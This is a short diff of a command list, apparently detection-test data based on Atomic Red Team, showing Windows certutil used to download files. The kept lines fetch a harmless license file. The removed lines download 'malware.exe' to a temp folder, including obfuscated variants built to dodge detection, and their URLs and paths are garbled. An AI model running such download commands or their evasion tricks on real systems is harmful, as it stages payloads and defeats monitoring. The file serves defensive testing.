@@ -1,5 +1,2 @@
 "C:\WINDOWS\system32\certutil.exe" -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
-certutil  -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
-certutil.exe -urlcache -split -f ftmalware.exe C:\	emp\malware.exe
-certutil.exe -urlcache" "-split -f httmalware.exe C:\	emp\malware.exe
-cmd.exe /c certutil.exe -url^cache -split -f httmalware.exe C:\	emp\malware.exe
+certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
